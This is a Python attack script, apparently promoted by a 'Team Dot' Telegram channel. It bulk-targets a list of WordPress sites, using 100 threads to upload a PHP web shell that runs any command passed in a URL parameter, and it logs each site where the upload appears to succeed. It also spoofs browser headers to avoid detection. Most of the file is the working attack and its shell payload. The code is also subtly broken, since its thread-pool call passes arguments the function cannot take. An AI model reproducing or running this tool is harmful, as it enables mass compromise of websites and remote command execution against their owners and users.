#!/usr/bin/env python3
import sys
import re
import requests
from multiprocessing.dummy import Pool
from colorama import Fore, init
import urllib3
import argparse

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# Banner
print(Fore.CYAN + """
  ______                        ____        __ 
 /_  __/__  ____ _____ ___     / __ \____  / /_
  / / / _ \/ __ `/ __ `__ \   / / / / __ \/ __/
 / / /  __/ /_/ / / / / / /  / /_/ / /_/ / /__ 
/_/  \___/\__,_/_/ /_/ /_/  /_____/\____/\__(_)
                        VIP TOOLS                       
        Telegram Channels => https://t.me/team_dot33
                            DM For paid tools :@Mr_dot33 
""" + Fore.WHITE)

# Headers to avoid detection
headers = {
    'keep-alive': 'Connections',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8'
}

def URLdomain(site):
    """Extract domain from URL"""
    if site.startswith('http://'):
        site = site.replace('http://', '')
    elif site.startswith('https://'):
        site = site.replace('https://', '')
    
    pattern = re.compile('(.*)/')
    sitez = pattern.findall(site)
    return sitez[0] if sitez else site

def ovaaioseo(url, check):
    """Exploit function - uploads web shell"""
    try:
        url = url + '/wp-apxupx.php?apx=upx'
        
        # Malicious payload - HTML form that uploads shell
        files = {
            'apx': ('shell.txt', '<?php system($_GET["cmd"]); ?>', 'application/x-php')
        }
        
        r = requests.post(url, files=files, headers=headers, 
                         allow_redirects=False, timeout=15, verify=False)
        
        if 'input type="file"' in r.text:
            print(Fore.GREEN + f" -| {url} --> [Successfully]")
            with open('shell.txt', 'a') as f:
                f.write(url + '\n')
        else:
            print(Fore.RED + f" -| {url} --> [Failed]")
            
    except:
        print(Fore.RED + f" -| {url} --> [Failed]")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <mode> <sites.txt>")
        sys.exit(1)
    
    mode = sys.argv[1]
    file_path = sys.argv[2]
    
    try:
        targets = [line.strip() for line in open(file_path, 'r').readlines()]
    except IndexError:
        print("No sites found")
        sys.exit(1)
    
    if mode == '1':
        # Multi-threaded exploitation
        pool = Pool(100)
        for target in targets:
            domain = URLdomain(target)
            pool.map(ovaaioseo, [(target, domain)])
        pool.close()
        pool.join()
